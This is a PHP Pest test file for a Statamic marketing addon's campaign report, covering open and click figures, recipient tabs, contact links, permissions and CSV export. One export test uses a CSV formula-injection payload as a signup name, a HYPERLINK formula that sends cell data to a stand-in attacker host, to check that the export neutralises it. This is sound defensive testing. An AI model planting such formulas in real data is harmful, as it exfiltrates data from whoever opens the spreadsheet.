<?php

/**
 * The campaign report: what happened to this campaign, and with whom.
 *
 * Not coverage — the properties that can break. A report is read once, after
 * the send, by somebody deciding what to do next, and every one of these is a
 * way it could quietly mislead them: a rate divided by nobody, a recipient
 * whose subscription is gone dropped from the list, a link to a contact that
 * does not exist, an export that describes a different selection than the
 * screen it came from, and — the one this release turns on — an open figure
 * silently redefined so that every campaign before it looks better than it was.
 */

use Carbon\CarbonImmutable;
use Goldnead\Leadhub\Models\Contact;
use Goldnead\Marketing\Contracts\Repositories\CampaignRepository;
use Goldnead\Marketing\Contracts\Repositories\MailingListRepository;
use Goldnead\Marketing\Data\Campaign;
use Goldnead\Marketing\Data\MailingList;
use Goldnead\Marketing\Models\Message;
use Goldnead\Marketing\Models\MessageEvent;
use Goldnead\Marketing\Models\Subscription;
use Goldnead\Marketing\Services\CampaignReport;
use Goldnead\Marketing\Services\CampaignStats;
use Goldnead\Marketing\Services\TrackingService;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Statamic\Facades\Role;
use Statamic\Facades\User;

/** The props of an Inertia response, decoded. */
function reportProps($response): array
{
    return json_decode($response->getContent(), true)['props'] ?? [];
}

/**
 * A Control Panel user who may read marketing and nothing else.
 *
 * The distinction the export rests on, and it needs a real role: a user with
 * no permissions at all cannot open the report either, so testing against one
 * would prove the route is guarded without proving *which* guard it is.
 */
function readerWhoMayOnlyLook()
{
    Role::make('marketing_reader')->addPermission('view marketing')->save();

    $reader = User::make()->email('reader@example.com');
    $reader->assignRole('marketing_reader');
    $reader->save();

    return $reader;
}

/** The report page, on one tab. */
function openReport(array $query = [], string $handle = 'brief')
{
    return test()->withHeaders(['X-Inertia' => 'true'])
        ->get(cp_route('marketing.campaigns.show', [$handle, ...$query]));
}

beforeEach(function (): void {
    $this->user = User::make()->email('report@example.com')->makeSuper();
    $this->user->save();
    $this->actingAs($this->user);

    app(MailingListRepository::class)->save(new MailingList(handle: 'newsletter', name: 'Newsletter'));
    app(CampaignRepository::class)->save(new Campaign(
        handle: 'brief',
        name: 'Der Brief',
        subject: 'Hallo',
        listHandle: 'newsletter',
    ));

    /** One recipient, delivered, with a subscription behind them. */
    $this->recipient = function (string $email, array $attributes = []): Message {
        $subscription = Subscription::create([
            'list_handle' => 'newsletter',
            'email' => $email,
            'first_name' => 'Maria',
            'last_name' => 'Muster',
            'status' => Subscription::STATUS_SUBSCRIBED,
        ]);

        $message = Message::create([
            'campaign_handle' => 'brief',
            'subscription_id' => $subscription->id,
            'email' => $email,
            'status' => Message::STATUS_SENT,
            'sent_at' => now()->subHour(),
            ...$attributes,
        ]);

        // The audience snapshot is written before the mail goes out — that is
        // what makes `MIN(created_at)` usable as "sending started" at all.
        // Left at the default, every fixture here would be a row that was
        // created an hour after it was sent, which cannot happen in a real
        // send and would quietly exercise the inconsistent-data path.
        if (! array_key_exists('created_at', $attributes)) {
            $message->forceFill(['created_at' => now()->subHours(2)])->save();
        }

        return $message->refresh();
    };
});

// -- A timeline that cannot contradict itself ----------------------------

it('leaves out a start it cannot vouch for rather than printing an impossible order', function (): void {
    // Nothing records when a send began, so the audience snapshot (the earliest
    // `created_at` among the messages) stands in for it. That stand-in is not
    // always true: messages written after the fact, an import, a re-run — and
    // then the screen read "Sent 12 August, Sending started 15 August", which
    // is not a thing that can have happened.
    //
    // Found by looking at the rendered page, not by the suite.
    $message = ($this->recipient)('spaet@example.com');
    $message->forceFill([
        'created_at' => now(),
        'sent_at' => now()->subDays(3),
    ])->save();

    app(CampaignRepository::class)->save(new Campaign(
        handle: 'brief',
        name: 'Der Brief',
        subject: 'Hallo',
        listHandle: 'newsletter',
        status: 'sent',
        sentAt: CarbonImmutable::now()->subDays(3),
    ));

    $keys = collect(app(CampaignReport::class)->timeline(app(CampaignRepository::class)->find('brief')))
        ->pluck('key');

    expect($keys)->not->toContain('started')
        ->and($keys)->toContain('sent');
});

it('keeps the start when it sits where a start belongs', function (): void {
    $message = ($this->recipient)('normal@example.com');
    $message->forceFill([
        'created_at' => now()->subDays(4),
        'sent_at' => now()->subDays(3),
    ])->save();

    app(CampaignRepository::class)->save(new Campaign(
        handle: 'brief',
        name: 'Der Brief',
        subject: 'Hallo',
        listHandle: 'newsletter',
        status: 'sent',
        sentAt: CarbonImmutable::now()->subDays(3),
    ));

    $keys = collect(app(CampaignReport::class)->timeline(app(CampaignRepository::class)->find('brief')))
        ->pluck('key');

    expect($keys)->toContain('started')->and($keys)->toContain('sent');
});

// -- Nobody at all --------------------------------------------------------

it('reports a campaign with no recipients without dividing by nobody', function (): void {
    // The first thing anybody does with a new campaign is open its report
    // before sending it. Every rate on this page has `sent` as its denominator.
    $response = openReport();

    $response->assertStatus(200);

    $props = reportProps($response);

    expect($props['stats']['recipients'])->toBe(0)
        ->and($props['stats']['open_rate'])->toBe(0)
        ->and($props['stats']['click_rate'])->toBe(0)
        ->and($props['humanOpens']['human'])->toBe(0)
        ->and($props['humanOpens']['human_rate'])->toBe(0)
        ->and($props['humanOpens']['machine_only'])->toBe(0)
        // Asserted against the rendered response too: a rate that came out as
        // NAN would serialise into the page as the literal string.
        ->and($response->getContent())->not->toContain('NaN')
        ->and($response->getContent())->not->toContain('null%');
});

it('shows a campaign with no recipients an empty timeline rather than five empty rows', function (): void {
    expect(reportProps(openReport())['timeline'])->toBe([]);
});

// -- The counters do not move ---------------------------------------------

it('leaves the existing campaign figures exactly where they were', function (): void {
    // The number this whole feature could have broken. `opened` counts every
    // message whose pixel was fetched, machine or person, and it is what every
    // earlier campaign and the tool before this one were measured with.
    // Redefining it here would have looked like a collapse in engagement that
    // never happened.
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordOpen($message->uuid, 'Mimecast MTA');

    $campaign = app(CampaignRepository::class)->find('brief');
    $stats = app(CampaignStats::class)->forCampaign($campaign);

    expect($stats['opened'])->toBe(1)
        ->and($stats['open_rate'])->toBe(100.0);

    // And the new figure, beside it, saying what the old one cannot.
    $human = app(CampaignReport::class)->humanOpens('brief', $stats);

    expect($human['human'])->toBe(0)
        ->and($human['machine_only'])->toBe(1)
        ->and($human['human_rate'])->toBe(0.0);
});

it('counts a person and a machine opening the same mail as one human open', function (): void {
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordOpen($message->uuid, 'Mimecast MTA');
    app(TrackingService::class)->recordOpen($message->uuid, 'SomeMailClient/3.2 (Linux)');

    $campaign = app(CampaignRepository::class)->find('brief');
    $stats = app(CampaignStats::class)->forCampaign($campaign);
    $human = app(CampaignReport::class)->humanOpens('brief', $stats);

    // Two fetches, one message, one reader.
    expect($stats['opened'])->toBe(1)
        ->and($human['human'])->toBe(1)
        ->and($human['machine_only'])->toBe(0);
});

it('marks the prefetch on the person who got one', function (): void {
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordOpen($message->uuid, 'Mimecast MTA');

    $rows = reportProps(openReport(['tab' => 'opens']))['rows'];

    expect($rows)->toHaveCount(1)
        ->and($rows[0]['machine_opens'])->toBe(1)
        ->and($rows[0]['human_opens'])->toBe(0)
        ->and($rows[0]['opens'])->toBe(1);
});

// -- The people behind the numbers ----------------------------------------

it('lists who opened, when first and how often', function (): void {
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordOpen($message->uuid, 'SomeMailClient/3.2 (Linux)');
    app(TrackingService::class)->recordOpen($message->uuid, 'SomeMailClient/3.2 (Linux)');

    $rows = reportProps(openReport(['tab' => 'opens']))['rows'];

    expect($rows)->toHaveCount(1)
        ->and($rows[0]['email'])->toBe('maria@example.com')
        ->and($rows[0]['name'])->toBe('Maria Muster')
        ->and($rows[0]['opens'])->toBe(2)
        ->and($rows[0]['human_opens'])->toBe(2)
        ->and($rows[0]['first_opened_at'])->not->toBeNull();
});

it('lists who clicked, when, and which link', function (): void {
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordClick($message->uuid, 'https://example.com/kurs');

    $props = reportProps(openReport(['tab' => 'clicks']));

    expect($props['rows'])->toHaveCount(1)
        ->and($props['rows'][0]['email'])->toBe('maria@example.com')
        ->and($props['rows'][0]['url'])->toBe('https://example.com/kurs')
        ->and($props['rows'][0]['clicked_at'])->not->toBeNull();
});

it('breaks the clicks down by link, with how many people behind each', function (): void {
    $maria = ($this->recipient)('maria@example.com');
    $jonas = ($this->recipient)('jonas@example.com');

    app(TrackingService::class)->recordClick($maria->uuid, 'https://example.com/kurs');
    app(TrackingService::class)->recordClick($maria->uuid, 'https://example.com/kurs');
    app(TrackingService::class)->recordClick($jonas->uuid, 'https://example.com/kurs');
    app(TrackingService::class)->recordClick($jonas->uuid, 'https://example.com/termine');

    $breakdown = reportProps(openReport(['tab' => 'clicks']))['urlBreakdown'];

    expect($breakdown)->toHaveCount(2)
        ->and($breakdown[0]['url'])->toBe('https://example.com/kurs')
        // Three clicks, two people. The difference is the whole reason both
        // columns are there.
        ->and($breakdown[0]['clicks'])->toBe(3)
        ->and($breakdown[0]['people'])->toBe(2)
        ->and($breakdown[1]['clicks'])->toBe(1)
        ->and($breakdown[1]['people'])->toBe(1);
});

it('lists who unsubscribed through this campaign', function (): void {
    $message = ($this->recipient)('maria@example.com');

    MessageEvent::create([
        'message_id' => $message->id,
        'type' => MessageEvent::TYPE_UNSUBSCRIBE,
    ]);

    $rows = reportProps(openReport(['tab' => 'unsubscribes']))['rows'];

    expect($rows)->toHaveCount(1)
        ->and($rows[0]['email'])->toBe('maria@example.com')
        ->and($rows[0]['unsubscribed_at'])->not->toBeNull();
});

it('shows the reason a delivery failed, which the schema has held all along', function (): void {
    ($this->recipient)('maria@example.com', [
        'status' => Message::STATUS_FAILED,
        'sent_at' => null,
        'error' => 'Mailbox does not exist',
    ]);

    $props = reportProps(openReport(['tab' => 'delivery']));

    expect($props['rows'][0]['error'])->toBe('Mailbox does not exist')
        ->and(collect($props['columns'])->pluck('field'))->toContain('error');
});

it('leaves the reason column off a campaign where nothing failed', function (): void {
    // The same rule as the Capped tile: a column of dashes on every report of
    // every install that never fails is noise pretending to be information.
    ($this->recipient)('maria@example.com');

    $props = reportProps(openReport(['tab' => 'delivery']));

    expect(collect($props['columns'])->pluck('field'))->not->toContain('error');
});

it('narrows the delivery list to one status', function (): void {
    ($this->recipient)('maria@example.com');
    ($this->recipient)('jonas@example.com', [
        'status' => Message::STATUS_BOUNCED,
        'error' => 'Hard bounce',
    ]);

    $rows = reportProps(openReport(['tab' => 'delivery', 'status' => 'bounced']))['rows'];

    expect($rows)->toHaveCount(1)
        ->and($rows[0]['email'])->toBe('jonas@example.com');
});

it('ignores a status nobody could have chosen', function (): void {
    ($this->recipient)('maria@example.com');

    $props = reportProps(openReport(['tab' => 'delivery', 'status' => 'exploded']));

    expect($props['rows'])->toHaveCount(1)
        ->and($props['filters']['status'])->toBeNull();
});

it('falls back to the overview for a tab that does not exist', function (): void {
    expect(reportProps(openReport(['tab' => 'wat']))['tab'])->toBe('overview');
});

// -- The person, when the subscription is gone ----------------------------

it('still shows the address of a recipient whose subscription was deleted', function (): void {
    // The address on the message is frozen at the moment of sending, precisely
    // so that the record of what went to whom survives the subscription being
    // corrected, moved or removed. A report that dropped the row — or crashed
    // reaching through a null relation for a name — would lose the delivery
    // that is hardest to explain and most often asked about.
    $message = ($this->recipient)('ghost@example.com');

    // Deleted out from under the message. The constraint cascades, so it is
    // lifted for this one statement — which is the state an install reaches
    // whenever rows are removed by hand, by an import, or by a restore.
    Schema::withoutForeignKeyConstraints(function () use ($message) {
        DB::table('marketing_subscriptions')->where('id', $message->subscription_id)->delete();
    });

    $props = reportProps(openReport(['tab' => 'delivery']));

    expect($props['rows'])->toHaveCount(1)
        ->and($props['rows'][0]['email'])->toBe('ghost@example.com')
        // No name, rather than the address printed twice under two headings.
        ->and($props['rows'][0]['name'])->toBeNull();
});

// -- The link to the person -----------------------------------------------

it('links a recipient to their LeadHub contact', function (): void {
    Contact::create(['email' => 'maria@example.com']);
    ($this->recipient)('maria@example.com');

    $row = reportProps(openReport(['tab' => 'delivery']))['rows'][0];

    expect($row['contact_url'])->toBeString()
        ->and($row['contact_url'])->toContain('leadhub/contacts/');
});

it('gives a recipient with no LeadHub contact no link at all', function (): void {
    // No link, not a dead one and not an invented page. The report is read by
    // somebody chasing a person down, and a link that 404s costs them the trip.
    ($this->recipient)('nobody@example.com');

    expect(reportProps(openReport(['tab' => 'delivery']))['rows'][0]['contact_url'])->toBeNull();
});

it('matches the contact on the normalised address, not on the stored one', function (): void {
    // The uuid on the subscription is only filled once a sign-up has been
    // confirmed and synced, which is why the whole addon resolves people by
    // address. That has to survive the address being written differently.
    Contact::create(['email' => 'maria@example.com']);
    ($this->recipient)('Maria@Example.com');

    expect(reportProps(openReport(['tab' => 'delivery']))['rows'][0]['contact_url'])->toBeString();
});

it('never creates a contact just because somebody opened a report', function (): void {
    ($this->recipient)('nobody@example.com');

    openReport(['tab' => 'delivery']);
    openReport(['tab' => 'opens']);

    expect(Contact::query()->count())->toBe(0);
});

it('hands out no contact links to somebody who may not see contacts', function (): void {
    // Every other link test runs as a super user, and Statamic lets a super
    // user past every gate — so the negative case had never actually been
    // executed.
    Contact::create(['email' => 'maria@example.com', 'email_normalized' => 'maria@example.com']);
    ($this->recipient)('maria@example.com');

    expect(reportProps(openReport(['tab' => 'delivery']))['rows'][0]['contact_url'])->not->toBeNull();

    $this->actingAs(readerWhoMayOnlyLook());

    expect(reportProps(openReport(['tab' => 'delivery']))['rows'][0]['contact_url'])->toBeNull();
});

// -- The export -----------------------------------------------------------

it('exports the same rows in the same order as the tab', function (): void {
    ($this->recipient)('erste@example.com');
    ($this->recipient)('zweite@example.com');
    ($this->recipient)('dritte@example.com');

    $onScreen = collect(reportProps(openReport(['tab' => 'delivery']))['rows'])->pluck('email')->all();

    $csv = $this->get(cp_route('marketing.campaigns.export', ['brief', 'tab' => 'delivery']));

    $csv->assertStatus(200);

    $lines = array_values(array_filter(explode("\n", trim($csv->streamedContent()))));
    $header = str_getcsv(ltrim($lines[0], "\xEF\xBB\xBF"), escape: '');
    $inFile = collect(array_slice($lines, 1))->map(fn ($line) => str_getcsv($line, escape: '')[0])->all();

    expect($inFile)->toBe($onScreen)
        ->and($header)->toBe(['email', 'name', 'status', 'sent_at', 'opens', 'clicks', 'error', 'contact_url']);
});

it('does not hand the spreadsheet a formula somebody signed up with', function (): void {
    // The name fields come straight from the public sign-up form, so a
    // stranger chooses their content. Excel and LibreOffice execute a cell
    // beginning with `=`, `+`, `-` or `@` the moment the file is opened — and
    // the person opening it is the one with `manage marketing campaigns`. The
    // BOM this export writes is what makes the spreadsheet treat the file as a
    // table rather than plain text, so the route is reliable, not theoretical.
    $subscription = Subscription::create([
        'list_handle' => 'newsletter',
        'email' => 'formel@example.com',
        'first_name' => '=HYPERLINK("https://boes.example/"&A1,"Rechnung")',
        'last_name' => 'Muster',
        'status' => Subscription::STATUS_SUBSCRIBED,
    ]);

    Message::create([
        'campaign_handle' => 'brief',
        'subscription_id' => $subscription->id,
        'email' => 'formel@example.com',
        'status' => Message::STATUS_SENT,
        'sent_at' => now()->subHour(),
    ]);

    $csv = $this->get(cp_route('marketing.campaigns.export', ['brief', 'tab' => 'delivery']));
    $csv->assertStatus(200);

    $lines = array_values(array_filter(explode("\n", trim($csv->streamedContent()))));
    $name = str_getcsv($lines[1], escape: '')[1];

    // Still readable, no longer executable: the apostrophe is the
    // spreadsheet's own "this is text" marker and is consumed on import.
    expect($name)->toStartWith("'")
        ->and($name)->toContain('HYPERLINK');
});

it('exports the filtered selection, not the whole campaign', function (): void {
    ($this->recipient)('maria@example.com');
    ($this->recipient)('jonas@example.com', ['status' => Message::STATUS_BOUNCED]);

    $csv = $this->get(cp_route('marketing.campaigns.export', [
        'brief', 'tab' => 'delivery', 'status' => 'bounced',
    ]));

    $content = $csv->streamedContent();

    expect($content)->toContain('jonas@example.com')
        ->and($content)->not->toContain('maria@example.com');
});

it('exports each person tab with its own columns', function (): void {
    $message = ($this->recipient)('maria@example.com');
    app(TrackingService::class)->recordClick($message->uuid, 'https://example.com/kurs');

    $content = $this->get(cp_route('marketing.campaigns.export', ['brief', 'tab' => 'clicks']))
        ->streamedContent();

    $lines = array_values(array_filter(explode("\n", trim($content))));

    expect(str_getcsv(ltrim($lines[0], "\xEF\xBB\xBF"), escape: ''))
        ->toBe(['email', 'name', 'clicked_at', 'url', 'contact_url'])
        ->and($content)->toContain('https://example.com/kurs');
});

it('refuses the export to somebody who may read the report but not manage it', function (): void {
    ($this->recipient)('maria@example.com');

    $this->actingAs(readerWhoMayOnlyLook())
        ->get(cp_route('marketing.campaigns.export', ['brief', 'tab' => 'delivery']))
        ->assertForbidden();
});

it('has nothing to export from the overview', function (): void {
    // The overview is figures, not rows. So is an unknown tab name, which
    // resolves to it.
    $this->get(cp_route('marketing.campaigns.export', ['brief', 'tab' => 'overview']))
        ->assertNotFound();

    $this->get(cp_route('marketing.campaigns.export', ['brief']))
        ->assertNotFound();
});

it('offers the export link only to somebody who may take the file', function (): void {
    ($this->recipient)('maria@example.com');

    expect(reportProps(openReport(['tab' => 'delivery']))['exportUrl'])->toBeString();

    $this->actingAs(readerWhoMayOnlyLook());

    $props = reportProps(openReport(['tab' => 'delivery']));

    // The tab still renders — reading a report is `view marketing`. Taking a
    // file of addresses off the server is not.
    expect($props['rows'])->toHaveCount(1)
        ->and($props['exportUrl'])->toBeNull();
});

// -- The click is what proves a person ------------------------------------

it('counts a click as a person, even when the only open was the machine', function (): void {
    // The expensive case, and the one this figure exists for. Apple's proxy
    // fetches the pixel for every delivered message, so the only open on
    // record is the machine's. Counting opens alone reported "read by nobody"
    // for a campaign somebody clicked through — while the note printed right
    // beneath it says a click is exactly what proves a person was there.
    $message = ($this->recipient)('mpp@example.com', ['opens' => 1, 'clicks' => 1]);

    MessageEvent::create([
        'message_id' => $message->id,
        'type' => MessageEvent::TYPE_OPEN,
        'machine' => true,
    ]);
    MessageEvent::create([
        'message_id' => $message->id,
        'type' => MessageEvent::TYPE_CLICK,
        'url' => 'https://example.com',
    ]);

    $opens = app(CampaignReport::class)->humanOpens('brief', app(CampaignStats::class)->forCampaign(
        app(CampaignRepository::class)->find('brief')
    ));

    expect($opens['human'])->toBe(1)
        ->and($opens['machine_only'])->toBe(0);
});

it('counts a person who opened and clicked once, not twice', function (): void {
    $message = ($this->recipient)('beides@example.com', ['opens' => 1, 'clicks' => 1]);

    MessageEvent::create(['message_id' => $message->id, 'type' => MessageEvent::TYPE_OPEN, 'machine' => false]);
    MessageEvent::create(['message_id' => $message->id, 'type' => MessageEvent::TYPE_CLICK, 'url' => 'https://example.com']);

    $opens = app(CampaignReport::class)->humanOpens('brief', app(CampaignStats::class)->forCampaign(
        app(CampaignRepository::class)->find('brief')
    ));

    expect($opens['human'])->toBe(1);
});

it('lists a reader who clicked with images off, whose counter never moved', function (): void {
    // `opens` stays 0 and `first_opened_at` is set — the timestamp this tab
    // sorts and titles itself by. Filtering on the counter dropped exactly the
    // people the tab is about, while the overview kept reporting a first open
    // for them.
    ($this->recipient)('bilder-aus@example.com', [
        'opens' => 0,
        'clicks' => 1,
        'first_opened_at' => now()->subMinutes(30),
    ]);

    $rows = reportProps(openReport(['tab' => 'opens']))['rows'];

    expect(collect($rows)->pluck('email'))->toContain('bilder-aus@example.com');
});

// -- The sequence ---------------------------------------------------------

it('leaves out the stations that did not happen', function (): void {
    ($this->recipient)('maria@example.com');

    $timeline = reportProps(openReport())['timeline'];
    $keys = collect($timeline)->pluck('key')->all();

    // Never scheduled, never opened: two stations that have no date, and
    // therefore no row. "Geplant: —" is an invitation to wonder what broke.
    expect($keys)->toContain('started')
        ->and($keys)->not->toContain('scheduled')
        ->and($keys)->not->toContain('first_open');
});

it('reports the first open and the last activity once they exist', function (): void {
    $message = ($this->recipient)('maria@example.com');

    app(TrackingService::class)->recordOpen($message->uuid, 'SomeMailClient/3.2 (Linux)');

    $keys = collect(reportProps(openReport())['timeline'])->pluck('key')->all();

    expect($keys)->toContain('first_open')
        ->and($keys)->toContain('last_activity');
});

// -- The boundary ---------------------------------------------------------

it('keeps another campaign out of every tab', function (): void {
    app(CampaignRepository::class)->save(new Campaign(
        handle: 'anderer',
        name: 'Anderer',
        listHandle: 'newsletter',
    ));

    $mine = ($this->recipient)('maria@example.com');
    $theirs = ($this->recipient)('fremd@example.com', ['campaign_handle' => 'anderer']);

    app(TrackingService::class)->recordClick($mine->uuid, 'https://example.com/a');
    app(TrackingService::class)->recordClick($theirs->uuid, 'https://example.com/b');

    $props = reportProps(openReport(['tab' => 'clicks']));

    expect($props['rows'])->toHaveCount(1)
        ->and($props['rows'][0]['email'])->toBe('maria@example.com')
        ->and($props['urlBreakdown'])->toHaveCount(1);
});
